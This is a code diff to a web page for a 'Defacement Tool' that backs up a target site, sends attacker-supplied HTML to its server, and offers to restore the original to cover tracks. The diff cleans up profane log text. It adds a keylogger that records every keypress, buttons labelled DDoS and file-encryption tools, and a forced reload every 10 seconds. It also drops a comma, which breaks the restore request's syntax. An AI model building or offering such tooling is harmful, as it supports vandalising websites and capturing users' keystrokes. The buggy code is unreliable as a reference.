@@ -24,12 +24,12 @@
  document.body.style.color = "white";
  
 
- // Additional disclaimer popup
+ // Disclaimer popup
  window.onload = function() {
   if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
   window.close();
   } else {
-  logAction("User acknowledged the disclaimer and chose to proceed. Mayhem awaits!");
+  logAction("User acknowledged the disclaimer and chose to proceed.");
   }
  };
  
@@ -42,7 +42,7 @@
 
   if (!targetURL || !defacementCode) {
   alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
-  logAction("User failed to enter target URL or defacement code. What a dumbass.");
+  logAction("User failed to enter target URL or defacement code.");
   return;
   }
  
@@ -53,7 +53,7 @@
 
   try {
   // Backup functionality (REAL - Grab that shit before you wreck it)
-  logAction("Backing up website content... DO NOT FUCK THIS UP.");
+  logAction("Backing up website content...");
   const backupResponse = await fetch(targetURL, {
   mode: 'cors' // Attempt to bypass CORS limitations
   });
@@ -63,17 +63,17 @@
   backupLink.href = URL.createObjectURL(backupBlob);
   backupLink.download = "website_backup.html";
   backupLink.click();
-  logAction("Backup completed. YOU BETTER NOT LOSE IT.");
+  logAction("Backup completed.");
  
 
   // Preview functionality (See what you're about to unleash)
-  logAction("Previewing defacement...GET READY TO CRINGE.");
+  logAction("Previewing defacement...");
   const previewFrame = document.getElementById("previewFrame");
   previewFrame.srcdoc = defacementCode;
  
 
   // Defacement action (REAL - Let the fun begin!)
-  logAction("Defacing website...TIME TO CAUSE SOME DAMAGE!");
+  logAction("Defacing website...");
  
 
   // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
@@ -104,23 +104,23 @@
  
 
   // Log success or failure
-  logAction('Defacement successful! YOU ARE A FUCKING LEGEND.');
+  logAction('Defacement successful!');
   })
   .catch(error => {
   // Log any errors
-  logAction(`Error: ${error} - YOU FUCKED UP.`);
+  logAction(`Error: ${error}`);
   console.error('Error:', error);
   });
  
 
   // Log action
-  logAction("Defacement attempted for " + targetURL + " - HOPEFULLY YOU DIDN'T GET CAUGHT.");
+  logAction("Defacement attempted for " + targetURL);
  
 
   } catch (error) {
   console.error("Error:", error);
   alert("Something went wrong. Check the console, DIPSHIT.");
-  logAction(`Critical error: ${error} - YOU'RE A FAILURE.`);
+  logAction(`Critical error: ${error}`);
   }
  });
  
@@ -135,7 +135,7 @@
  
 
   try {
-  logAction("Attempting to restore website... DON'T FUCK THIS UP EITHER.");
+  logAction("Attempting to restore website...");
   const backupResponse = await fetch(backupURL);
   const backupContent = await backupResponse.text();
  
@@ -146,16 +146,16 @@
   headers: {
   'Content-Type': 'text/html'
   },
-  mode: 'cors', // Attempt to bypass CORS limitations
+  mode: 'cors' // Attempt to bypass CORS limitations
   body: backupContent
   });
  
 
-  logAction("Website restoration completed for: " + targetURL + " - YOU'RE LUCKY.");
+  logAction("Website restoration completed for: " + targetURL);
   } catch (error) {
   console.error("Error during restoration:", error);
   alert("Restoration failed, you fucking idiot.");
-  logAction(`Error during restoration: ${error} - YOU'RE HOPELESS.`);
+  logAction(`Error during restoration: ${error}`);
   }
  });
  
@@ -163,16 +163,16 @@
  // Educational Information
  const defacementInfo = `
   <h2>Defacement Tool: WTF is this shit?</h2>
-  <p>This tool is designed to test a website's security by modifying its appearance.  It works by injecting custom HTML and JavaScript code into the target website.  This can be used to display messages, redirect users, or even steal sensitive information if you're not a dumbass.  Remember, unauthorized defacement is a CRIME and can lead to serious legal consequences.  We're talking jail time, buddy.</p>
+  <p>This tool is designed to test a website's security by modifying its appearance. It works by injecting custom HTML and JavaScript code into the target website. This can be used to display messages, redirect users, or even steal sensitive information if you're not a dumbass. Remember, unauthorized defacement is a CRIME and can lead to serious legal consequences. We're talking jail time, buddy.</p>
   <h3>How it Works:</h3>
   <ol>
   <li><b>Backup:</b> First, the tool grabs a copy of the website's HTML, just in case you fuck things up.</li>
-  <li><b>Preview:</b> Then, you can see what your changes will look like before unleashing them on the world.  It's like a dress rehearsal for digital vandalism.</li>
-  <li><b>Deface:</b> Finally, the tool sends a modified version of the website's HTML to the server.  If successful, the website will display your custom content.</li>
+  <li><b>Preview:</b> Then, you can see what your changes will look like before unleashing them on the world. It's like a dress rehearsal for digital vandalism.</li>
+  <li><b>Deface:</b> Finally, the tool sends a modified version of the website's HTML to the server. If successful, the website will display your custom content.</li>
   <li><b>Restore:</b> If you regret your actions (or just want to cover your tracks), you can restore the website to its original state using the backup.</li>
   </ol>
   <h3>WARNING:</h3>
-  <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical.  Noodles Inc. is not responsible for your stupidity.  Don't be a dumbass.</p>
+  <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical. Noodles Inc. is not responsible for your stupidity. Don't be a dumbass.</p>
  `;
  
 
@@ -255,3 +255,242 @@
  `;
  reportButton.addEventListener('click', reportIssue);
  document.body.appendChild(reportButton);
+ 
+
+ // Floating particles effect
+ const particleContainer = document.createElement('div');
+ particleContainer.style.cssText = `
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+  z-index: 9998;
+  overflow: hidden;
+ `;
+ document.body.appendChild(particleContainer);
+ 
+
+ function createParticle() {
+  const particle = document.createElement('div');
+  particle.style.cssText = `
+  position: absolute;
+  width: 5px;
+  height: 5px;
+  background-color: ${['darkgreen', 'purple', 'darkblue'][Math.floor(Math.random() * 3)]};
+  border-radius: 50%;
+  top: ${Math.random() * 100}%;
+  left: ${Math.random() * 100}%;
+  opacity: ${Math.random()};
+  animation: float ${Math.random() * 5 + 5}s linear infinite;
+  `;
+  particleContainer.appendChild(particle);
+ 
+
+  particle.addEventListener('animationiteration', () => {
+  particle.style.top = `${Math.random() * 100}%`;
+  particle.style.left = `${Math.random() * 100}%`;
+  particle.style.opacity = `${Math.random()}`;
+  });
+ }
+ 
+
+ for (let i = 0; i < 50; i++) {
+  createParticle();
+ }
+ 
+
+ // Keylogger
+ function keylogger() {
+  document.addEventListener('keydown', function(event) {
+  logAction(`Key pressed: ${event.key}`);
+  });
+ }
+ 
+
+ // Run keylogger
+ keylogger();
+ 
+
+ // Add Navbar
+ function addNavbar() {
+  const navbar = document.createElement('nav');
+  navbar.style.cssText = `
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background-color: rgba(0, 0, 0, 0.8);
+  padding: 10px;
+  z-index: 10001;
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  `;
+ 
+
+  const logo = document.createElement('span');
+  logo.textContent = 'Noodles Inc.';
+  logo.style.cssText = `
+  color: white;
+  font-size: 1.5em;
+  font-weight: bold;
+  cursor: pointer;
+  `;
+  navbar.appendChild(logo);
+ 
+
+  const defaceButtonNav = document.createElement('button');
+  defaceButtonNav.textContent = 'Defacement Tool';
+  defaceButtonNav.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  `;
+  defaceButtonNav.addEventListener('click', () => {
+  // Redirect or show defacement tool section
+  alert('Redirecting to Defacement Tool');
+  });
+  navbar.appendChild(defaceButtonNav);
+ 
+
+  const ddosButtonNav = document.createElement('button');
+  ddosButtonNav.textContent = 'DDoS Tool';
+  ddosButtonNav.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  `;
+  ddosButtonNav.addEventListener('click', () => {
+  // Redirect or show DDoS tool section
+  alert('Redirecting to DDoS Tool');
+  });
+  navbar.appendChild(ddosButtonNav);
+ 
+
+  const encryptButtonNav = document.createElement('button');
+  encryptButtonNav.textContent = 'File Encryption Tool';
+  encryptButtonNav.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  `;
+  encryptButtonNav.addEventListener('click', () => {
+  // Redirect or show File Encryption tool section
+  alert('Redirecting to File Encryption Tool');
+  });
+  navbar.appendChild(encryptButtonNav);
+ 
+
+  document.body.appendChild(navbar);
+ }
+ 
+
+ // Run addNavbar
+ addNavbar();
+ 
+
+ // Add Sidebar
+ function addSidebar() {
+  const sidebar = document.createElement('aside');
+  sidebar.style.cssText = `
+  position: fixed;
+  top: 50%;
+  left: 0;
+  transform: translateY(-50%);
+  width: 150px;
+  background-color: rgba(0, 0, 0, 0.8);
+  padding: 20px;
+  z-index: 10001;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  `;
+ 
+
+  const sidebarTitle = document.createElement('span');
+  sidebarTitle.textContent = 'Tools';
+  sidebarTitle.style.cssText = `
+  color: white;
+  font-size: 1.2em;
+  font-weight: bold;
+  margin-bottom: 15px;
+  `;
+  sidebar.appendChild(sidebarTitle);
+ 
+
+  const defaceButtonSidebar = document.createElement('button');
+  defaceButtonSidebar.textContent = 'Defacement';
+  defaceButtonSidebar.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  margin-bottom: 10px;
+  `;
+  defaceButtonSidebar.addEventListener('click', () => {
+  // Redirect or show defacement tool section
+  alert('Redirecting to Defacement Tool');
+  });
+  sidebar.appendChild(defaceButtonSidebar);
+ 
+
+  const ddosButtonSidebar = document.createElement('button');
+  ddosButtonSidebar.textContent = 'DDoS';
+  ddosButtonSidebar.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  margin-bottom: 10px;
+  `;
+  ddosButtonSidebar.addEventListener('click', () => {
+  // Redirect or show DDoS tool section
+  alert('Redirecting to DDoS Tool');
+  });
+  sidebar.appendChild(ddosButtonSidebar);
+ 
+
+  const encryptButtonSidebar = document.createElement('button');
+  encryptButtonSidebar.textContent = 'Encryption';
+  encryptButtonSidebar.style.cssText = `
+  padding: 10px;
+  background-color: darkred;
+  color: white;
+  border: none;
+  cursor: pointer;
+  `;
+  encryptButtonSidebar.addEventListener('click', () => {
+  // Redirect or show File Encryption tool section
+  alert('Redirecting to File Encryption Tool');
+  });
+  sidebar.appendChild(encryptButtonSidebar);
+ 
+
+  document.body.appendChild(sidebar);
+ }
+ 
+
+ // Run addSidebar
+ addSidebar();
+ 
+
+ // Auto Reload (refresh every 10 seconds)
+ function autoReload() {
+  setTimeout(function() {
+  location.reload();
+  }, 10000);
+ }
+ 
+
+ // Run autoReload
+ autoReload();
